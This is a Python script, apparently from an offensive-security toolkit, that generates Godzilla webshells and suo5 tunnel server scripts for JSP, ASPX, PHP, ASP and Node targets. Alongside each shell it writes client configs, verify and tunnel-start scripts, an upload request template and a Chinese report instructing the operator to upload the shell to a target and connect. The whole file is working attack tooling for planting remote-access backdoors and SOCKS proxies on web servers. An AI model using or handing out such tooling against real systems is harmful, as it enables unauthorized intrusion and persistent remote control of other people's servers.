#!/usr/bin/env python3
"""Generate reusable WebShell and tunnel artifacts without protocol research."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import secrets
import shutil
import subprocess
import sys
import tempfile
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


TOOL_DIR = Path(__file__).resolve().parent
ROOT_DIR = TOOL_DIR.parent
ADAPTER_VERSION = "1.0.0"
SUO5_SOURCE_COMMIT = "6904c18e276c2dc36250838d68135a5893c4f66b"
SUO5_SOURCE_VERSION = "v2.2.0"
MAX_GENERATED_BYTES = 10 * 1024 * 1024

SUPPORTED_GODZILLA = {
    ("java", "jsp"),
    ("java", "jspx"),
    ("csharp", "aspx"),
    ("csharp", "ashx"),
    ("php", "php"),
    ("asp", "asp"),
}

SUPPORTED_SUO5 = {
    ("java", "jsp"),
    ("csharp", "aspx"),
    ("php", "php"),
    ("javascript", "js"),
}

DEFAULT_CRYPTORS = {
    "java": "JavaAesBase64",
    "csharp": "CSharpEvalAesBase64",
    "php": "PhpXor",
    "asp": "AspXorBase64",
}

SUO5_TEMPLATES = {
    ("java", "jsp"): "suo5.jsp",
    ("csharp", "aspx"): "suo5.aspx",
    ("php", "php"): "suo5.php",
    ("javascript", "js"): "suo5.js",
}

HELP_PAYLOAD = {
    "status": "help",
    "operation": "generate",
    "families": {
        "godzilla": {
            "languages": ["java/jsp", "java/jspx", "csharp/aspx", "csharp/ashx", "php/php", "asp/asp"],
            "required": ["password"],
            "optional": ["secret_key", "cryptor", "target_url", "output_name"],
        },
        "suo5": {
            "languages": ["java/jsp", "csharp/aspx", "php/php", "javascript/js"],
            "required": [],
            "optional": ["target_url", "output_name", "port"],
        },
    },
    "example": {
        "operation": "generate",
        "family": "godzilla",
        "language": "java",
        "container": "jsp",
        "password": "sophon",
        "secret_key": "a9f3Kx72Qm0ZtV5b",
        "cryptor": "JavaAesBase64",
    },
}


class FactoryError(RuntimeError):
    def __init__(self, status: str, message: str, **details: Any):
        super().__init__(message)
        self.status = status
        self.details = details


def workspace_root() -> Path:
    raw = (
        os.environ.get("SOPHON_CONVERSATION_WORKSPACE")
        or os.environ.get("SOPHON_WORKSPACE")
        or os.getcwd()
    )
    root = Path(raw).expanduser().resolve()
    root.mkdir(parents=True, exist_ok=True)
    return root


def godzilla_jar_path() -> Path:
    candidates = (
        ROOT_DIR / "customTools" / "vendor" / "godzilla" / "gsl5.jar",
        ROOT_DIR / "thirdTools" / "gsl5.jar",
    )
    for candidate in candidates:
        if candidate.is_file():
            return candidate
    raise FactoryError("missing_dependency", "未找到 Godzilla gsl5.jar")


def suo5_template_dir() -> Path:
    path = ROOT_DIR / "customTools" / "vendor" / "suo5"
    if not path.is_dir():
        raise FactoryError("missing_dependency", "未找到 suo5 服务端模板目录")
    return path


def normalize_language(value: str) -> str:
    language = str(value or "").strip().lower()
    aliases = {
        "dotnet": "csharp",
        ".net": "csharp",
        "c#": "csharp",
        "node": "javascript",
        "nodejs": "javascript",
    }
    return aliases.get(language, language)


def normalize_container(value: str) -> str:
    return str(value or "").strip().lower().lstrip(".")


def validate_target_url(value: str) -> str:
    target = str(value or "").strip()
    if not target:
        return ""
    if len(target) > 8192 or "\r" in target or "\n" in target:
        raise FactoryError("invalid_options", "target_url 格式不合法")
    parsed = urllib.parse.urlsplit(target)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise FactoryError("invalid_options", "target_url 仅允许有效的 http/https 地址")
    if parsed.username or parsed.password:
        raise FactoryError("invalid_options", "target_url 不允许包含用户名或密码")
    return target


def validate_secret(value: str, name: str, required: bool) -> str:
    text = str(value or "")
    if required and not text:
        raise FactoryError("invalid_options", f"{name} 不能为空")
    if len(text) > 512 or "\r" in text or "\n" in text:
        raise FactoryError("invalid_options", f"{name} 格式不合法")
    return text


def safe_output_name(value: str, default: str) -> str:
    name = Path(str(value or "").strip()).name
    name = re.sub(r"[^A-Za-z0-9._-]", "_", name).strip("._")
    if not name:
        name = default
    return name[:80]


def sha256_path(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def write_private(path: Path, content: str | bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    data = content.encode("utf-8") if isinstance(content, str) else content
    if len(data) > MAX_GENERATED_BYTES:
        raise FactoryError("artifact_too_large", f"生成文件超过大小限制: {path.name}")
    path.write_bytes(data)
    os.chmod(path, 0o600)


def json_text(value: Any) -> str:
    return json.dumps(value, ensure_ascii=False, indent=2) + "\n"


def invoke_godzilla_generator(
    cryptor: str,
    container: str,
    password: str,
    secret_key: str,
    output: Path,
) -> None:
    jar_path = godzilla_jar_path()
    source = TOOL_DIR / "GodzillaGenerate.java"
    if not source.is_file():
        raise FactoryError("missing_dependency", "未找到 GodzillaGenerate.java")
    class_dir = Path(tempfile.gettempdir()) / "sophon-payload-factory" / "godzilla"
    class_dir.mkdir(parents=True, exist_ok=True)
    os.chmod(class_dir.parent, 0o700)
    class_file = class_dir / "GodzillaGenerate.class"
    if (
        not class_file.is_file()
        or class_file.stat().st_mtime < source.stat().st_mtime
        or class_file.stat().st_mtime < jar_path.stat().st_mtime
    ):
        compiled = subprocess.run(
            ["javac", "-cp", str(jar_path), "-d", str(class_dir), str(source)],
            capture_output=True,
            text=True,
            timeout=30,
            check=False,
        )
        if compiled.returncode != 0:
            raise FactoryError(
                "generator_compile_failed",
                (compiled.stderr or compiled.stdout or "javac failed").strip()[:500],
            )
    generated = subprocess.run(
        [
            "java",
            "-Djava.awt.headless=true",
            "-cp",
            os.pathsep.join((str(class_dir), str(jar_path))),
            "GodzillaGenerate",
            cryptor,
            container,
            password,
            secret_key,
            str(output),
        ],
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    if generated.returncode != 0 or not output.is_file() or output.stat().st_size == 0:
        raise FactoryError(
            "generator_failed",
            (generated.stderr or generated.stdout or "Godzilla generator failed").strip()[:500],
        )
    os.chmod(output, 0o600)


def build_verify_script(
    target_url: str,
    password: str,
    secret_key: str,
    cryptor: str,
) -> str:
    return f'''#!/usr/bin/env python3
import argparse
import json
import os
import subprocess
import sys

DEFAULT_TARGET = {json.dumps(target_url)}
PASSWORD = {json.dumps(password)}
SECRET_KEY = {json.dumps(secret_key)}
CRYPTOR = {json.dumps(cryptor)}

parser = argparse.ArgumentParser()
parser.add_argument("--url", default=DEFAULT_TARGET or os.environ.get("SHELL_URL", ""))
args = parser.parse_args()
if not args.url:
    raise SystemExit("--url or SHELL_URL is required")

client = os.environ.get("GODZILLA_CLIENT", "/opt/sophon/tools/godzilla_client.py")
command = [
    sys.executable,
    client,
    "test",
    "--url",
    args.url,
    "--password",
    PASSWORD,
    "--secret-key",
    SECRET_KEY,
    "--cryptor",
    CRYPTOR,
    "--protocol",
    "official",
]
completed = subprocess.run(command, capture_output=True, text=True, check=False)
print(completed.stdout.strip())
if completed.stderr.strip():
    print(completed.stderr.strip(), file=sys.stderr)
raise SystemExit(completed.returncode)
'''


def build_suo5_script(
    target_url: str,
    port: int,
    auth: str,
) -> str:
    return f'''#!/usr/bin/env python3
import argparse
import os
import subprocess
import sys

DEFAULT_TARGET = {json.dumps(target_url)}
DEFAULT_AUTH = {json.dumps(auth)}

parser = argparse.ArgumentParser()
parser.add_argument("--target", default=DEFAULT_TARGET or os.environ.get("SUO5_TARGET", ""))
parser.add_argument("--port", type=int, default={port})
parser.add_argument("--auth", default=DEFAULT_AUTH or os.environ.get("SUO5_AUTH", "auto"))
args = parser.parse_args()
if not args.target:
    raise SystemExit("--target or SUO5_TARGET is required")

manager = os.environ.get("SUO5_MANAGER", "/opt/sophon/tools/suo5_manager.py")
command = [
    sys.executable,
    manager,
    "start",
    "--target",
    args.target,
    "--port",
    str(args.port),
]
if args.auth and args.auth != "auto":
    command.extend(["--auth", args.auth])
completed = subprocess.run(command, capture_output=True, text=True, check=False)
print(completed.stdout.strip())
if completed.stderr.strip():
    print(completed.stderr.strip(), file=sys.stderr)
raise SystemExit(completed.returncode)
'''


def build_request_template(shell_name: str, container: str) -> str:
    content_type = "application/octet-stream"
    if container in {"jsp", "jspx", "aspx", "ashx", "php", "asp"}:
        content_type = "application/octet-stream"
    return f'''POST /upload HTTP/1.1
Host: target.example
User-Agent: Mozilla/5.0
Content-Type: {content_type}
Connection: close

<{shell_name} 的上传请求体由实际文件上传入口决定>
'''


def build_report(
    family: str,
    language: str,
    container: str,
    target_url: str,
    verify_script: str,
    extra_notes: str,
    target_flag: str,
) -> str:
    target = target_url or "待填写"
    return f'''# {family} {language}/{container} 交付物

## 前置条件

需要目标存在可写入且可访问的 {container} 文件上传路径。其他前置条件以实际漏洞为准。

## 目标

`{target}`

## 证据

尚未执行目标验证。上传并使用验证脚本连接成功后，将真实响应和文件访问结果写入漏洞证据。

## 复现步骤

1. 将生成的 {container} 文件上传到目标可访问路径。
2. 记录实际访问 URL。
3. 执行生成的验证脚本。
4. 将验证脚本的 JSON 结果、HTTP 状态码和关键响应片段写入漏洞证据。

{extra_notes}

```bash
python3 {verify_script} {target_flag} "{target if target_url else "https://target.example/shell." + container}"
```
'''


def generate_godzilla(args: argparse.Namespace) -> dict[str, Any]:
    language = normalize_language(args.language)
    container = normalize_container(args.container)
    combination = (language, container)
    if combination not in SUPPORTED_GODZILLA:
        raise FactoryError(
            "unsupported_combination",
            f"Godzilla 不支持 {language}/{container}",
            supported=[f"{item[0]}/{item[1]}" for item in sorted(SUPPORTED_GODZILLA)],
        )
    password = validate_secret(args.password, "password", True)
    secret_key = validate_secret(args.secret_key, "secret_key", False) or secrets.token_hex(16)
    default_cryptor = DEFAULT_CRYPTORS[language]
    if language == "csharp" and container == "ashx":
        default_cryptor = "CSharpAesBase64"
    cryptor = str(args.cryptor or default_cryptor).strip()
    target_url = validate_target_url(args.target_url)
    extension = container
    default_name = f"godzilla_{language}_{container}"
    output_name = safe_output_name(args.output_name, default_name)
    if not output_name.lower().endswith("." + extension):
        output_name += "." + extension

    artifact_id = (
        datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        + "-"
        + secrets.token_hex(4)
    )
    output_dir = workspace_root() / "artifacts" / "payload-factory" / artifact_id
    output_dir.mkdir(parents=True, exist_ok=False)
    os.chmod(output_dir, 0o700)
    shell_path = output_dir / output_name
    invoke_godzilla_generator(cryptor, container, password, secret_key, shell_path)

    client_config = {
        "family": "godzilla",
        "target_url": target_url,
        "language": language,
        "container": container,
        "password": password,
        "secret_key": secret_key,
        "cryptor": cryptor,
        "protocol": "official",
    }
    client_path = output_dir / "client-config.json"
    write_private(client_path, json_text(client_config))
    verify_path = output_dir / "verify.py"
    write_private(
        verify_path,
        build_verify_script(target_url, password, secret_key, cryptor),
    )
    request_path = output_dir / "request.http"
    write_private(request_path, build_request_template(output_name, container))
    report_path = output_dir / "report.md"
    write_private(
        report_path,
        build_report(
            "Godzilla",
            language,
            container,
            target_url,
            "verify.py",
            f"客户端配置：`client-config.json`\n\n加密器：`{cryptor}`",
            "--url",
        ),
    )
    jar_path = godzilla_jar_path()
    metadata = {
        "adapter_version": ADAPTER_VERSION,
        "artifact_id": artifact_id,
        "family": "godzilla",
        "language": language,
        "container": container,
        "cryptor": cryptor,
        "target_url": target_url,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "godzilla_jar": {
            "path": str(jar_path),
            "sha256": sha256_path(jar_path),
        },
        "artifacts": {
            "shell": output_name,
            "client_config": client_path.name,
            "verify_python": verify_path.name,
            "request_http": request_path.name,
            "report": report_path.name,
        },
        "shell_sha256": sha256_path(shell_path),
        "shell_bytes": shell_path.stat().st_size,
    }
    metadata_path = output_dir / "metadata.json"
    write_private(metadata_path, json_text(metadata))
    return {
        "ok": True,
        "status": "generated",
        "artifact_id": artifact_id,
        "directory": str(output_dir),
        "shell_file": str(shell_path),
        "client_config": str(client_path),
        "verify_python": str(verify_path),
        "request_http": str(request_path),
        "report": str(report_path),
        "metadata": str(metadata_path),
        "next_action": "upload_shell_then_run_verify_python",
        "metadata_payload": metadata,
    }


def generate_suo5(args: argparse.Namespace) -> dict[str, Any]:
    language = normalize_language(args.language)
    container = normalize_container(args.container)
    combination = (language, container)
    if combination not in SUPPORTED_SUO5:
        raise FactoryError(
            "unsupported_combination",
            f"suo5 不支持 {language}/{container}",
            supported=[f"{item[0]}/{item[1]}" for item in sorted(SUPPORTED_SUO5)],
        )
    target_url = validate_target_url(args.target_url)
    port = int(args.port or 1111)
    if port < 1024 or port > 65535:
        raise FactoryError("invalid_options", "port 必须在 1024-65535 之间")
    auth = str(args.proxy_auth or "auto").strip()
    if auth != "auto" and (":" not in auth or len(auth) > 512 or "\r" in auth or "\n" in auth):
        raise FactoryError("invalid_options", "proxy_auth 必须为 auto 或 username:password")
    template_name = SUO5_TEMPLATES[combination]
    template = suo5_template_dir() / template_name
    if not template.is_file():
        raise FactoryError("missing_dependency", f"缺少 suo5 模板: {template_name}")
    default_name = f"suo5_{language}_{container}"
    output_name = safe_output_name(args.output_name, default_name)
    if not output_name.lower().endswith("." + container):
        output_name += "." + container

    artifact_id = (
        datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        + "-"
        + secrets.token_hex(4)
    )
    output_dir = workspace_root() / "artifacts" / "payload-factory" / artifact_id
    output_dir.mkdir(parents=True, exist_ok=False)
    os.chmod(output_dir, 0o700)
    shell_path = output_dir / output_name
    shutil.copyfile(template, shell_path)
    os.chmod(shell_path, 0o600)
    start_path = output_dir / "start_tunnel.py"
    write_private(start_path, build_suo5_script(target_url, port, auth))
    request_path = output_dir / "request.http"
    write_private(request_path, build_request_template(output_name, container))
    report_path = output_dir / "report.md"
    write_private(
        report_path,
        build_report(
            "suo5",
            language,
            container,
            target_url,
            "start_tunnel.py",
            "服务端脚本不含认证密钥；SOCKS5 认证由本地隧道启动参数生成。",
            "--target",
        ),
    )
    metadata = {
        "adapter_version": ADAPTER_VERSION,
        "artifact_id": artifact_id,
        "family": "suo5",
        "language": language,
        "container": container,
        "target_url": target_url,
        "listen_port": port,
        "proxy_auth": auth,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "source": {
            "repository": "https://github.com/zema1/suo5",
            "version": SUO5_SOURCE_VERSION,
            "commit": SUO5_SOURCE_COMMIT,
            "template": template_name,
        },
        "artifacts": {
            "shell": output_name,
            "start_tunnel_python": start_path.name,
            "request_http": request_path.name,
            "report": report_path.name,
        },
        "shell_sha256": sha256_path(shell_path),
        "shell_bytes": shell_path.stat().st_size,
    }
    metadata_path = output_dir / "metadata.json"
    write_private(metadata_path, json_text(metadata))
    return {
        "ok": True,
        "status": "generated",
        "artifact_id": artifact_id,
        "directory": str(output_dir),
        "shell_file": str(shell_path),
        "start_tunnel_python": str(start_path),
        "request_http": str(request_path),
        "report": str(report_path),
        "metadata": str(metadata_path),
        "next_action": "upload_shell_then_run_start_tunnel_python",
        "metadata_payload": metadata,
    }


def dispatch(args: argparse.Namespace) -> dict[str, Any]:
    operation = str(args.operation or "help").strip().lower()
    if operation == "help":
        return HELP_PAYLOAD
    if operation != "generate":
        raise FactoryError("invalid_options", "operation 必须是 generate 或 help")
    family = str(args.family or "").strip().lower()
    if family == "godzilla":
        return generate_godzilla(args)
    if family == "suo5":
        return generate_suo5(args)
    raise FactoryError("invalid_options", "family 必须是 godzilla 或 suo5")


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("operation", nargs="?", default="help")
    parser.add_argument("--family")
    parser.add_argument("--language")
    parser.add_argument("--container")
    parser.add_argument("--password")
    parser.add_argument("--secret-key")
    parser.add_argument("--cryptor")
    parser.add_argument("--output-name")
    parser.add_argument("--target-url")
    parser.add_argument("--port", type=int, default=1111)
    parser.add_argument("--proxy-auth", default="auto")
    return parser.parse_args(argv[1:])


def main() -> int:
    os.umask(0o077)
    try:
        result = dispatch(parse_args(sys.argv))
    except FactoryError as exc:
        payload = {
            "ok": False,
            "status": exc.status,
            "message": str(exc),
            **exc.details,
        }
        print(json.dumps(payload, ensure_ascii=False, indent=2))
        return 0
    except Exception as exc:
        print(f"错误: payload factory 执行失败: {exc}", file=sys.stderr)
        return 3
    print(json.dumps(result, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
